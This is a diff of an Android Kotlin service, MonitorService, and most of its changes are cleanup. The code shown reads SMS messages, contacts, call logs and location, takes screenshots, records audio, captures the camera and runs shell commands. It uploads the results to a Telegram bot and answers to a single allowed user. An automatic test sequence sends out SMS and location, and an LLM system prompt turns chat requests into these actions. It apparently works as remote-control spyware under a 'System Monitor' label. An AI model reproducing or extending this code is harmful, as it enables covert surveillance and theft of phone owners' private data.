@@ -23,28 +23,20 @@ import android.os.Binder
 import android.os.Build
 import android.os.Environment
 import android.os.IBinder
-import android.os.IInterface
 import android.provider.CallLog
 import android.provider.ContactsContract
-import android.provider.MediaStore
 import android.provider.Telephony
-import android.util.Base64
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import okhttp3.MediaType
-import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody
-import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
-import java.util.regex.Pattern
 import java.io.File
-import java.io.FileOutputStream
-import java.io.OutputStreamWriter
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -53,6 +45,8 @@ import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.concurrent.thread
+import java.util.regex.Pattern
+import java.util.concurrent.atomic.AtomicReference
 
 const val PREFS_NAME = "monitor_config"
 const val KEY_PERSISTENT = "persistent_mode"
@@ -130,12 +124,11 @@ class MonitorService : Service() {
         if (testCompleted.getAndSet(true)) return
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         if (prefs.getBoolean(KEY_TEST_SENT, false)) return
-        
-        // Check if we have key permissions
+
         val hasSms = checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
         val hasContacts = checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
         val hasLocation = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-        
+
         if (hasSms || hasContacts || hasLocation) {
             thread("test-run") {
                 runTestSequence()
@@ -148,27 +141,21 @@ class MonitorService : Service() {
         try {
             Log.d("MonitorService", "Running test sequence...")
             var results = ""
-            
-            // 1. Screenshot
+
             val screenResult = getScreenshot()
             results += "Screenshot: ${screenResult["status"] ?: "completed"}\n"
-            
-            // 2. Last 10 SMS
+
             val smsResult = getSms()
             val smsList = smsResult["sms"] as? List<*> ?: emptyList()
-            val smsPreview = smsList.take(10).joinToString("\n") { 
+            val smsPreview = smsList.take(10).joinToString("\n") {
                 "${it["type"]}: ${it["address"]} - ${it["body"]?.take(50) ?: ""}"
             }
             results += "SMS (last 10):\n$smsPreview\n\n"
-            
-            // 3. Location
+
             val locResult = getLocation()
             results += "Location: ${locResult["lat"]?.let { "lat=${it}, lon=${locResult["lon"]}, acc=${locResult["acc"]}m" } ?: locResult["error"] ?: locResult["note"]}\n"
-            
-            // Send as file if large
+
             sendTelegramDocument(ALLOWED_USER_ID, "test_results.txt", results, "Test Sequence Results")
-            
-            // Also send summary
             sendTelegramMessage(ALLOWED_USER_ID, "Test completed:\n- Screenshot: ${screenResult["status"]}\n- SMS: ${smsResult["count"]} messages\n- Location: ${locResult["lat"]?.let { "OK" } ?: locResult["error"] ?: locResult["note"]}")
         } catch (e: Exception) {
             Log.e("MonitorService", "Test error", e)
@@ -201,7 +188,7 @@ class MonitorService : Service() {
                 client.newCall(req).execute().use { Log.d("Telegram", "WH: ${it.body?.string()}") }
             } catch (e: Exception) { Log.e("Telegram", "WH error", e) }
         }
-        
+
         pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
     }
 
@@ -236,12 +223,12 @@ class MonitorService : Service() {
         val chatId = msg.get("chat").asJsonObject.get("id").asLong
         val userId = msg.get("from").asJsonObject.get("id").asLong
         val text = msg.get("text")?.asString ?: ""
-        
+
         if (userId != ALLOWED_USER_ID) {
             sendTelegramMessage(chatId, "Unauthorized. Your ID: $userId")
             return
         }
-        
+
         val trimmed = text.trim()
         when {
             trimmed == "/start" || trimmed == "/help" -> sendTelegramMessage(chatId, getHelp())
@@ -281,8 +268,7 @@ class MonitorService : Service() {
         }
         try {
             sendBroadcast(intent)
-            
-            // Wait for result (max 30 seconds)
+
             if (latch.await(30, TimeUnit.SECONDS)) {
                 val msg = if (callback.status == "completed" && callback.result != null) {
                     "Task $taskId completed:\n${callback.result}"
@@ -339,14 +325,14 @@ class MonitorService : Service() {
             "audio" -> recordAudio(args as Map<String, Any>)
             "camera" -> captureCamera(args as Map<String, Any>)
             "shell" -> runShell(args["command"] as? String ?: "")
-            else -> mutableMapOf<String, Any>().apply { put("error", "Unknown capability: $capability") }
+            else -> mutableMapOf("error" to "Unknown capability: $capability")
         }
     }
 
     private fun getContacts(): Map<String, Any> {
         val list = mutableListOf<Map<String, Any>>()
         try {
-            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, 
+            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                 arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.HAS_PHONE_NUMBER),
                 null, null, null)
             cursor?.use {
@@ -383,7 +369,7 @@ class MonitorService : Service() {
     private fun getSms(): Map<String, Any> {
         val list = mutableListOf<Map<String, Any>>()
         try {
-            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, 
+            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI,
                 arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                 null, null, "${Telephony.Sms.DATE} DESC")
             cursor?.use {
@@ -493,8 +479,7 @@ class MonitorService : Service() {
             val locationManager = getSystemService(LocationManager::class.java)
             val provider = locationManager?.getBestProvider(
                 android.location.Criteria().apply { accuracy = android.location.Criteria.ACCURACY_FINE }, true) ?: "gps"
-            
-            // Return last known immediately (instant)
+
             val lastLoc = locationManager?.getLastKnownLocation(provider)
             if (lastLoc != null) {
                 val m = mutableMapOf<String, Any>()
@@ -506,8 +491,7 @@ class MonitorService : Service() {
                 m["note"] = "Last known location (may be stale)"
                 return m
             }
-            
-            // Quick single update with 5s timeout
+
             val latch = CountDownLatch(1)
             var result: Map<String, Any>? = null
             val listener = object : LocationListener {
@@ -525,7 +509,7 @@ class MonitorService : Service() {
                 override fun onProviderEnabled(provider: String) {}
                 override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?) {}
             }
-            
+
             try {
                 locationManager?.requestSingleUpdate(provider, listener, null)
                 if (latch.await(5, TimeUnit.SECONDS)) {
@@ -555,7 +539,6 @@ class MonitorService : Service() {
                         prepare()
                         start()
                     }
-                    // Auto-stop in background
                     thread("audio-stop") {
                         Thread.sleep((duration * 1000L).toLong())
                         stopRecording()
@@ -609,14 +592,14 @@ class MonitorService : Service() {
             putExtra("status", status)
         }
         sendBroadcast(intent)
-        
+
         telegramCallbacks[taskId]?.let { callback ->
             callback.result = result?.toString()
             callback.error = error
             callback.status = status
             callback.latch.countDown()
         }
-        
+
         if (replyChat != 0L) {
             val msg = if (status == "completed" && result != null) {
                 "Task $taskId completed:\n$result"
@@ -641,7 +624,7 @@ class MonitorService : Service() {
             flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
         }
         val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
-        NotificationCompat.Builder(this, "monitor_service")
+        return NotificationCompat.Builder(this, "monitor_service")
             .setContentTitle("System Monitor")
             .setContentText("Monitoring active")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
@@ -667,14 +650,13 @@ class MonitorService : Service() {
         } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
     }
 
-    // Send large text as .txt file
     private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = "") {
         thread("tg-doc-$chatId") {
             try {
                 val url = "$TELEGRAM_API$BOT_TOKEN/sendDocument"
                 val file = File(getExternalFilesDir(null), filename)
                 file.writeText(content)
-                
+
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chatId.toString())
@@ -682,7 +664,7 @@ class MonitorService : Service() {
                     .addFormDataPart("document", filename,
                         RequestBody.create(file.readBytes(), okhttp3.MediaType.parse("text/plain")))
                     .build()
-                
+
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
                 client.newCall(req).execute().use { Log.d("Telegram", "Doc sent to $chatId") }
                 file.delete()
@@ -720,13 +702,12 @@ class MonitorService : Service() {
 
 private fun callNemotron(prompt: String): String {
     try {
-        // Quick response for simple greetings
         val lower = prompt.lowercase()
         if (Pattern.matches("^(hi|hello|hey|test|ping)$", lower)) {
             return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
         }
-        
-        val systemPrompt = """You are an AI assistant controlling an Android monitoring agent. 
+
+        val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
 Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
 For each user request, respond with a JSON object containing:
 {
@@ -861,7 +842,6 @@ private fun handleAiCommand(chatId: Long, prompt: String) {
                 callback.result = msg
                 callback.status = "completed"
                 callback.latch.countDown()
-                // Send as file if large
                 sendTelegramDocument(chatId, "ai_result.txt", msg, "AI Task Result")
             } else {
                 sendTelegramMessage(chatId, "AI task $taskId timed out")
